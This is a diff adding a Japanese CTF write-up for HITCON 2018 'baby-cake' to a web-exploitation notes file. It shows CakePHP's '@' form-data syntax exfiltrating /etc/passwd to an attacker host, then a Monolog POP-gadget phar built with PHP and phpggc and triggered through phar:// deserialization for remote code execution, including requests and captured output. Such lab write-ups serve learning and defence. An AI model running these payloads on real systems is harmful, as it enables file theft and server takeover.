@@ -559,6 +559,564 @@ O:10:”Expression”:3:{s:14:” Expression op”;s:17:”file_get_contents”;
 ```txt
 O:10:”Expression”:3:{s:14:” Expression op”;s:4:”exec”;s:18:” Expression params”;s:6:”ls -la”;s:9:”stringify”;s:5:”2 / 0";}
 ```
+## Local File Disclosure / phar:// / file_get_contetns (hitcon2018 baby-cake)
+https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake  
+https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge  
+- **entrypoint**  
+CAKE PHPで書かれたソースが配布される。  
+mainの処理は`src/Controller/PagesController.php`に書かれている。  
+`cache_get($key)`の中に`unserialize`があって脆弱性があるっぽいが、その中には`cache_set`で`serialize($response->headers)`でシリアライズした文字列しか入りえないので脆弱ではない。  
+`display(...$path)`関数の中の`$response = $this->httpclient($method, $url, $headers, $data);`で`?url=`に指定したURLに`?data`で指定したdataを伴ってアクセスしてくれるらしい。  
+つまり、例えばPOSTで`/?url=http://IP&data=test`とアクセスすれば、このWebサーバーが`http://IP`に対して`data=test`をデータとしてPOSTリクエストでアクセスしてくれるっぽい。  
+`if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )`でホワイトリストでプロトコルをチェックしているので、`phar://`みたいにアクセスさせることはできない…  
+`$response = $this->httpclient($method, $url, $headers, $data);`で`httpclient`メソッドの中の`new Client()`でCLientインスタンスを作成している。  
+したがって次は`vendor/cakephp/cakephp/src/Http/Client.php`を見る。  
+```php
+<?php
+
+namespace App\Controller;
+use Cake\Core\Configure;
+use Cake\Http\Client;
+use Cake\Http\Exception\ForbiddenException;
+use Cake\Http\Exception\NotFoundException;
+use Cake\View\Exception\MissingTemplateException;
+
+class DymmyResponse {
+    function __construct($headers, $body) {
+        $this->headers = $headers;
+        $this->body = $body;
+    }
+}
+
+class PagesController extends AppController {
+
+    private function httpclient($method, $url, $headers, $data) {
+        $options = [
+            'headers' => $headers, 
+            'timeout' => 10
+        ];
+
+        $http = new Client();
+        return $http->$method($url, $data, $options);
+    }
+
+    private function back() {
+        return $this->render('pages');
+    }
+
+    private function _cache_dir($key){
+        $ip = $this->request->getEnv('REMOTE_ADDR');
+        $index = sprintf('mycache/%s/%s/', $ip, $key);
+        return CACHE . $index;
+    }
+
+    private function cache_set($key, $response) {
+        $cache_dir = $this->_cache_dir($key);
+        if ( !file_exists($cache_dir) ) {
+            mkdir($cache_dir, 0700, true);
+            file_put_contents($cache_dir . "body.cache", $response->body);
+            file_put_contents($cache_dir . "headers.cache", serialize($response->headers));
+        }
+    }
+
+    private function cache_get($key) {
+        $cache_dir = $this->_cache_dir($key);
+        if (file_exists($cache_dir)) {
+            $body   = file_get_contents($cache_dir . "/body.cache");
+            $headers = file_get_contents($cache_dir . "/headers.cache");
+            
+            $body = "<!-- from cache -->\n" . $body;
+            $headers = unserialize($headers);
+            return new DymmyResponse($headers, $body);
+        } else {
+            return null;
+        }
+    }
+
+    public function display(...$path) {    
+        $request  = $this->request;
+        $data = $request->getQuery('data');
+        $url  = $request->getQuery('url');
+        if (strlen($url) == 0) 
+            return $this->back();
+
+        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );
+        if (strlen($scheme) == 0 || !in_array($scheme, ['http', 'https']))
+            return $this->back();
+
+        $method = strtolower( $request->getMethod() );
+        if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )
+            return $this->back();
+
+
+        $headers = [];
+        foreach ($request->getHeaders() as $key => $value) {
+            if (in_array( strtolower($key), ['host', 'connection', 'expect', 'content-length'] ))
+                continue;
+            if (count($value) == 0)
+                continue;
+
+            $headers[$key] = $value[0];
+        }
+
+        $key = md5($url);
+        if ($method == 'get') {
+            $response = $this->cache_get($key);
+            if (!$response) {
+                $response = $this->httpclient($method, $url, $headers, null);
+                $this->cache_set($key, $response);                
+            }
+        } else {
+            $response = $this->httpclient($method, $url, $headers, $data);
+        }
+
+        foreach ($response->headers as $key => $value) {
+            if (strtolower($key) == 'content-type') {
+                $this->response->type(array('type' => $value));
+                $this->response->type('type');
+                continue;
+            }
+            $this->response->withHeader($key, $value);
+        }
+
+        $this->response->body($response->body);
+        return $this->response;
+    }
+    private function httpclient($method, $url, $headers, $data) {
+        $options = [
+            'headers' => $headers, 
+            'timeout' => 10
+        ];
+
+        $http = new Client();
+        return $http->$method($url, $data, $options);
+    }
+}
+```
+`vendor/cakephp/cakephp/src/Http/Client.php`  
+`src/Controller/PagesController.php`の`httpclient`メソッドで、`$http->$method($url, $data, $options);`を実行するが、POSTを指定している場合は`$method`の中身は`post`なので、`$http->post()`が呼び出されることになる。  
+`post`メソッドの中では`$this->_doRequest(Request::METHOD_POST, $url, $data, $options);`で`_doRequest`メソッドを実行する。  
+この中では`$request = $this->_createRequest(`で`_createRequest`メソッドを実行してその中では`Request`クラスのインスタンスを作成している。  
+したがって、次は`vendor/cakephp/cakephp/src/Http/Client/Request.php`の中身をみる。  
+```php
+    /**
+     * Default configuration for the client.
+     *
+     * @var array
+     */
+    protected $_defaultConfig = [
+        'adapter' => 'Cake\Http\Client\Adapter\Stream',
+
+    ...
+
+    public function __construct($config = [])
+    {
+        $this->setConfig($config);
+
+        $adapter = $this->_config['adapter'];
+        $this->setConfig('adapter', null);
+        if (is_string($adapter)) {
+            $adapter = new $adapter();
+        }
+        $this->_adapter = $adapter;
+
+
+    ...
+
+    /**
+     * Do a POST request.
+     *
+     * @param string $url The url or path you want to request.
+     * @param mixed $data The post data you want to send.
+     * @param array $options Additional options for the request.
+     * @return \Cake\Http\Client\Response
+     */
+    public function post($url, $data = [], array $options = [])
+    {
+        $options = $this->_mergeOptions($options);
+        $url = $this->buildUrl($url, [], $options);
+
+        return $this->_doRequest(Request::METHOD_POST, $url, $data, $options);
+    }
+
+    ...
+
+    /**
+     * Helper method for doing non-GET requests.
+     *
+     * @param string $method HTTP method.
+     * @param string $url URL to request.
+     * @param mixed $data The request body.
+     * @param array $options The options to use. Contains auth, proxy, etc.
+     * @return \Cake\Http\Client\Response
+     */
+    protected function _doRequest($method, $url, $data, $options)
+    {
+        $request = $this->_createRequest(
+            $method,
+            $url,
+            $data,
+            $options
+        );
+
+        return $this->send($request, $options);
+    }
+
+    ...
+
+    /**
+     * Creates a new request object based on the parameters.
+     *
+     * @param string $method HTTP method name.
+     * @param string $url The url including query string.
+     * @param mixed $data The request body.
+     * @param array $options The options to use. Contains auth, proxy, etc.
+     * @return \Cake\Http\Client\Request
+     */
+    protected function _createRequest($method, $url, $data, $options)
+    {
+        $headers = isset($options['headers']) ? (array)$options['headers'] : [];
+        if (isset($options['type'])) {
+            $headers = array_merge($headers, $this->_typeHeaders($options['type']));
+        }
+        if (is_string($data) && !isset($headers['Content-Type']) && !isset($headers['content-type'])) {
+            $headers['Content-Type'] = 'application/x-www-form-urlencoded';
+        }
+
+        $request = new Request($url, $method, $headers, $data);
+
+    ...
+
+    }
+```
+`vendor/cakephp/cakephp/src/Http/Client/Request.php`  
+`__construct`で`$this->body($data)`で`?data=`の値を`body`メソッドに引数として与えている。  
+`form`メソッドの中では、`if (is_array($body)) {`の中で`?body[test]=aaaa`みたいに値がArrayの場合に`$formData->addMany($body);`で`addMany($body)`を実行する。  
+この`addMany`メソッドは`$formData = new FormData();`より`FormData`クラスのメソッドなので、次は`vendor/cakephp/cakephp/src/Http/Client/FormData.php`を見る。  
+```php
+    /**
+     * Constructor
+     *
+     * Provides backwards compatible defaults for some properties.
+     *
+     * @param string $url The request URL
+     * @param string $method The HTTP method to use.
+     * @param array $headers The HTTP headers to set.
+     * @param array|string|null $data The request body to use.
+     */
+    public function __construct($url = '', $method = self::METHOD_GET, array $headers = [], $data = null)
+    {
+        $this->validateMethod($method);
+        $this->method = $method;
+        $this->uri = $this->createUri($url);
+        $headers += [
+            'Connection' => 'close',
+            'User-Agent' => 'CakePHP'
+        ];
+        $this->addHeaders($headers);
+        $this->body($data);
+    }
+
+    ...
+
+    /**
+     * Get/set the body/payload for the message.
+     *
+     * Array data will be serialized with Cake\Http\FormData,
+     * and the content-type will be set.
+     *
+     * @param string|array|null $body The body for the request. Leave null for get
+     * @return mixed Either $this or the body value.
+     */
+    public function body($body = null)
+    {
+        if ($body === null) {
+            $body = $this->getBody();
+
+            return $body ? $body->__toString() : '';
+        }
+        if (is_array($body)) {
+            $formData = new FormData();
+            $formData->addMany($body);
+            $this->header('Content-Type', $formData->contentType());
+            $body = (string)$formData;
+        }
+        $stream = new Stream('php://memory', 'rw');
+        $stream->write($body);
+        $this->stream = $stream;
+
+        return $this;
+    }
+```
+`vendor/cakephp/cakephp/src/Http/Client/FormData.php`  
+`addMany`メソッドの中で`?data[test]=aaa`を`$name=test`,`$value=aaa`に分解して`$this->add($name, $value);`で`add`メソッドを実行している。  
+`add`メソッドの中では`} elseif (is_string($value) && strlen($value) && $value[0] === '@') {`で`?data[test]=@aaa`みたいに`@`から始まっている場合は`$this->addFile($name, $value);`で`addFile`メソッドを実行する。  
+`addFile`メソッドで`$value = substr($value, 1);`で`@`を取り除いて`$content = file_get_contents($value);`でファイルを読みだす。  
+つまり、`?url=http://IP&data[test]=@/etc/passwd`とすれば`/etc/passwd`をdataとして`http://IP`にPOSTしてくれる！！！   
+これでLocal File Disclosureができる！！！！  
+```php
+    /**
+     * Add a new part to the data.
+     *
+     * The value for a part can be a string, array, int,
+     * float, filehandle, or object implementing __toString()
+     *
+     * If the $value is an array, multiple parts will be added.
+     * Files will be read from their current position and saved in memory.
+     *
+     * @param string|\Cake\Http\Client\FormData $name The name of the part to add,
+     *   or the part data object.
+     * @param mixed $value The value for the part.
+     * @return $this
+     */
+    public function add($name, $value = null)
+    {
+        if (is_array($value)) {
+            $this->addRecursive($name, $value);
+        } elseif (is_resource($value)) {
+            $this->addFile($name, $value);
+        } elseif (is_string($value) && strlen($value) && $value[0] === '@') {
+            trigger_error(
+                'Using the @ syntax for file uploads is not safe and is deprecated. ' .
+                'Instead you should use file handles.',
+                E_USER_DEPRECATED
+            );
+            $this->addFile($name, $value);
+        } elseif ($name instanceof FormDataPart && $value === null) {
+            $this->_hasComplexPart = true;
+            $this->_parts[] = $name;
+        } else {
+            $this->_parts[] = $this->newPart($name, $value);
+        }
+
+        return $this;
+    }
+
+    /**
+     * Add multiple parts at once.
+     *
+     * Iterates the parameter and adds all the key/values.
+     *
+     * @param array $data Array of data to add.
+     * @return $this
+     */
+    public function addMany(array $data)
+    {
+        foreach ($data as $name => $value) {
+            $this->add($name, $value);
+        }
+
+        return $this;
+    }
+
+    /**
+     * Add either a file reference (string starting with @)
+     * or a file handle.
+     *
+     * @param string $name The name to use.
+     * @param mixed $value Either a string filename, or a filehandle.
+     * @return \Cake\Http\Client\FormDataPart
+     */
+    public function addFile($name, $value)
+    {
+        $this->_hasFile = true;
+
+        $filename = false;
+        $contentType = 'application/octet-stream';
+        if (is_resource($value)) {
+            $content = stream_get_contents($value);
+            if (stream_is_local($value)) {
+                $finfo = new finfo(FILEINFO_MIME);
+                $metadata = stream_get_meta_data($value);
+                $contentType = $finfo->file($metadata['uri']);
+                $filename = basename($metadata['uri']);
+            }
+        } else {
+            $finfo = new finfo(FILEINFO_MIME);
+            $value = substr($value, 1);
+            $filename = basename($value);
+            $content = file_get_contents($value);
+            $contentType = $finfo->file($value);
+        }
+        $part = $this->newPart($name, $content);
+        $part->type($contentType);
+        if ($filename) {
+            $part->filename($filename);
+        }
+        $this->add($part);
+
+        return $part;
+    }
+```
+以下で`/etc/passwd`が得られたらしい。  
+```txt
+POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/passwd
+```
+
+```txt
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+orange:x:1001:1001:,,,:/home/orange:/bin/bash
+```
+以下で`000-default.conf`を読みだしてWebrootを確認すると`/var/www/html`であることがわかる。  
+```txt
+POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/apache2/sites-enabled/000-default.conf
+```
+```txt
+<VirtualHost *:80>
+	...
+
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+
+	...
+</VirtualHost>
+```
+このWebサイトの機能として、アクセスした先のbodyの内容を`body.cache`に格納してくれるので、`phar`の内容を書き込んで`phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(URL)/body.cache`として読み込めば`unserialize`されてRCEできる！  
+コマンドの実行結果は`?url=`で指定するIPに送信できる！  
+したがって、攻撃者の用意したサーバー上に`exploit.phar`を用意してそこにアクセスさせれば、`/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache`に`exploit.phar`の内容が書き込まれて、それを`phar://`で読み込んでRCEする！  
+pharには有名はMonologのPOPガジェットが使えるらしい。  
+これを実行するいは`/etc/php/7.2/cli/php.ini`で`;phar.readonly = On`を`phar.readonly = Off`にする必要がある。`/etc/php/7.2/apache2/php.ini`の方じゃないので注意。  
+これを`$php make-explot-phar.php`で実行する。  
+```php
+<?php
+
+namespace Monolog\Handler
+{
+    class SyslogUdpHandler
+    {
+        protected $socket;
+        function __construct($x)
+        {
+            $this->socket = $x;
+        }
+    }
+    class BufferHandler
+    {
+        protected $handler;
+        protected $bufferSize = -1;
+        protected $buffer;
+        # ($record['level'] < $this->level) == false
+        protected $level = null;
+        protected $initialized = true;
+        # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
+        protected $bufferLimit = -1;
+        protected $processors;
+        function __construct($methods, $command)
+        {
+            $this->processors = $methods;
+            $this->buffer = [$command];
+            $this->handler = clone $this;
+        }
+    }
+}
+
+namespace{
+    $cmd = "ls -alt";
+
+    $obj = new \Monolog\Handler\SyslogUdpHandler(
+        new \Monolog\Handler\BufferHandler(
+            ['current', 'system'],
+            [$cmd, 'level' => null]
+        )
+    );
+
+    $phar = new Phar('exploit.phar');
+    $phar->startBuffering();
+    $phar->addFromString('test', 'test');
+    $phar->setStub('<?php __HALT_COMPILER(); ? >');
+    $phar->setMetadata($obj);
+    $phar->stopBuffering();
+
+}
+```
+作成された`exploit.phar`は以下の通り。  
+```txt
+$ cat exploit.phar
+<?php __HALT_COMPILER(); ?>
+pO:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:7:"ls -alt";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:7:"ls -alt";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}test;a`~ؤtestX
+j{>ңLە"GBMB
+```
+ちなみにPHPGCCのコマンドを使って作成した場合は以下の通りとなった。  
+```txt
+$ ./phpggc -p phar -o exploit-monolog1.phar monolog/rce1 system id
+$ cat exploit-monolog1.phar
+<?php __HALT_COMPILER(); ?>
+fO:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}dummye`~ؤtest.txte`~ؤtesttest+eE㦶#h)z'GBMB
+```
+- **payload**  
+まず以下でexplot.pharの内容を`/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache`に書き込む  
+```txt
+GET http://13.230.134.135/?url=http://IP/exploit.phar
+```
+次に`phar://`で読み込んでRCEする。実行結果は`?url=`に送信される。  
+```txt
+POST http://13.230.134.135/?url=http://IP&data[test]=@phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache
+```
+```txt
+total 104
+drwxr-xr-x  26 root root  1000 Oct 21 11:08 run
+drwxrwxrwt   2 root root  4096 Oct 21 06:25 tmp
+-rwsr-sr-x   1 root root  8568 Oct 18 19:53 read_flag
+drwxr-xr-x  23 root root  4096 Oct 18 19:53 .
+drwxr-xr-x  23 root root  4096 Oct 18 19:53 ..
+drwx------   5 root root  4096 Oct 18 17:12 root
+drwxr-xr-x  90 root root  4096 Oct 18 11:23 etc
+dr-xr-xr-x  13 root root     0 Oct 16 07:57 sys
+-r--------   1 root root    54 Oct 15 19:49 flag
+drwxr-xr-x   4 root root  4096 Oct 15 19:41 home
+drwxr-xr-x   3 root root  4096 Oct  9 06:07 boot
+lrwxrwxrwx   1 root root    31 Oct  9 06:07 initrd.img -> boot/initrd.img-4.15.0-1023-aws
+lrwxrwxrwx   1 root root    28 Oct  9 06:07 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
+drwxr-xr-x   2 root root  4096 Oct  9 06:07 sbin
+lrwxrwxrwx   1 root root    14 Oct  8 17:14 www -> /var/www/html/
+drwxr-xr-x  14 root root  4096 Oct  8 17:13 var
+drwxr-xr-x   5 root root  4096 Oct  8 17:06 snap
+drwxr-xr-x  15 root root  2980 Oct  8 17:06 dev
+dr-xr-xr-x 136 root root     0 Oct  8 17:06 proc
+lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
+lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
+drwxr-xr-x  20 root root  4096 Sep 12 16:16 lib
+drwx------   2 root root 16384 Sep 12 16:10 lost+found
+drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
+drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
+drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
+drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
+drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
+drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
+drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
+```
+##
+- **entrypoint**  
+- **payload**  
 ##
 - **entrypoint**  
 - **payload**  
